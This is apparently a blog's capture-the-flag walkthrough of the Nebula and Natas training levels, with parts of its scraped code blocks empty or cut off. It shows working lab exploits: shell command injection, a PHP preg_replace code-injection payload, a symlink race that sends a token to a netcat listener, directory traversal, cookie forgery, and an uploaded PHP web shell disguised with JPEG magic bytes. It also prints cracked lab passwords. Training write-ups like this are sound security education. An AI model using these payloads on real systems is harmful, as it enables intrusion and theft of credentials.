<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>

<h3>Level03</h3>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<p>So we have a shell script and a directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03$ ls
</span><span class='line'>writable.d  writable.sh
</span><span class='line'>level03@nebula:/home/flag03$ cat writable.sh 
</span><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>for i in /home/flag03/writable.d/* ; do
</span><span class='line'>  (ulimit -t 5; bash -x "$i")
</span><span class='line'>  rm -f "$i"
</span><span class='line'>done
</span></code></pre></td></tr></table></div></figure>


<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh 
</span><span class='line'>/bin/getflag &gt; /tmp/readme</span></code></pre></td></tr></table></div></figure>


<p>Now wait a bit and check the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level04</h3>

<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>

<p>Right, so our goal is to read the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ls
</span><span class='line'>flag04  token</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
</span><span class='line'>level04@nebula:/tmp$ ls -l readthis 
</span><span class='line'>lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token</span></code></pre></td></tr></table></div></figure>


<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2</span></code></pre></td></tr></table></div></figure>


<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level05</h3>

<p>Check the flag05 home directory. You are looking for weak directory permissions</p>

<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>

<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>

<h3>Level06</h3>

<p>The flag06 account credentials came from a legacy unix system.</p>

<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>

<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ cat /etc/passwd

</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'>?:hello
</span><span class='line'>
</span><span class='line'>1 password hash cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh&#8217;ing and getting the flag:</p>

<h3>Level 07</h3>

<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># Specifies an alternate port number to listen on.
</span><span class='line'>port=7007
</span><span class='line'>
</span><span class='line'># Specifies what user to switch to after initialization when started as root.
</span><span class='line'>user=flag07
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>

<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.

<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>

<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>

<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8.png" title="level8" alt="level8"></p>

<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH&#8217;ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8hex.png" title="level8hex" alt="level8hex"></p>

<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>

<ul>
<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
</ul>


<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>

<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>

<ul>
<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
</ul>


<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>

<ul>
<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
</ul>


<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>

<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
be escaped by backslashes in substituted backreferences.</p></blockquote>

<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>

<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>

<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/test
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>nothing to see here</span></code></pre></td></tr></table></div></figure>


<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>

<p>First of all, the line that facilitates the exploitation is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>haxor@hack.com becomes haxor AT hack dot com</span></code></pre></td></tr></table></div></figure>


<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email haxor@hack.com]</span></code></pre></td></tr></table></div></figure>


<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</span></code></pre></td></tr></table></div></figure>


<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{${eval()}}</span></code></pre></td></tr></table></div></figure>


<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email {${system()}}]</span></code></pre></td></tr></table></div></figure>


<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>

<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>

<ul>
<li><p>we want to run <em>getflag</em></p></li>
<li><p>we can run external commands in PHP with <em>system()</em></p></li>
<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
<li><p>we have to put the exploit into a file to be read by the binary</p></li>
</ul>


<p>With all these requirements in mind, I created a file with the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ cat /tmp/useme
</span><span class='line'>[email {${system($use_me)}}]</span></code></pre></td></tr></table></div></figure>


<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span></code></pre></td></tr></table></div></figure>


<p>Pff, this was a difficult level, but really interesting and I learned something!</p>

<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>

<ul>
<li><em>int access(const char </em>pathname, int mode);*</li>
</ul>


<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>

<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
reason, the use of this system call should be avoided.</p></blockquote>

<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>

<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
</span><span class='line'>Connecting to 192.168.80.130:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!</span></code></pre></td></tr></table></div></figure>


<p>And on my netcat side:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
</span><span class='line'>.oO Oo.
</span><span class='line'>blabla</span></code></pre></td></tr></table></div></figure>


<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>

<ul>
<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# while true; do nc -nlp 18211; done</span></code></pre></td></tr></table></div></figure>


<ul>
<li>on the Nebula machine, I ran this command:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do touch /tmp/tok & ./flag10 /tmp/tok 192.168.80.130 & ln -fs /home/flag10/token /tmp/tok & rm -f /tmp/tok; done</span></code></pre></td></tr></table></div></figure>


<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>

<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>

<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done</span></code></pre></td></tr></table></div></figure>


<p>And in the other:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done</span></code></pre></td></tr></table></div></figure>


<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>

<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag10@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>

    <content type="html"><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<p>This time we are also given the backend source code:</p>

<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas7.png" title="natas7" alt="natas 7"></p>

<p>Inside the source there&rsquo;s a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span></code></pre></td></tr></table></div></figure>


<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas6.png" title="natas8" alt="natas 8"></p>

<p>We have to look at PHP source code again:</p>

<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<p>Ran this through the PHP sandbox at <a href="http://sandbox.onlinephpfunctions.com/">http://sandbox.onlinephpfunctions.com/</a> and the result was the string <code>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</code>. The string <em>qw8J</em> gets repeated, this is the key! Now we can reuse the code to create a cookie encrypted with this key, and with <em>showpassword</em> set to yes:</p>

</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>The code tests if the file satisfies the constraints and uploads it with a new name that&rsquo;s randomly generated. Then it gives you the link where you can find it:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/upload.png" title="upload" alt="upload"></p>

<p>So I tried uploading a PHP file that would read the password for the next level:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat pass.php 
</span><span class='line'>&lt;?
</span><span class='line'>echo(exec('cat /etc/natas_webpass/natas13'));
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>But the extension is changed to a jpg, so the code doesn&rsquo;t get executed. Further in the HTML there is this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;filename&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used Firebug to change the jpg extension to a php one and re-uploaded the file and this time it worked: <code>The file upload/g72k7zidu8.php has been uploaded</code>. Next I followed the link and inside was the password: <code>jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</code></p>

<h3>Level 13</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas13.png" title="natas13" alt="natas 13"></p>

<p>Ok, this time they made a modification so that only jpg files can be uploaded..or so they claim. The code is the same as the last challenge, except for a new check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;File is not an image&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>exif_imagetype()</strong> reads the first bytes of an image and checks its signature. If the signature is invalid, it returns False.</p>

<p>This type of check can be fooled by providing the specific magic number for the file in question. The signature for jpg files is the hex value 0xFFD8FFE0</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# echo -e '\xFF\xD8\xFF\xE0' &gt; pass.php
</span><span class='line'>root@kali:~/Desktop# echo "&lt;?echo(exec('cat /etc/natas_webpass/natas13'));?&gt;" &gt;&gt; pass.php </span></code></pre></td></tr></table></div></figure>


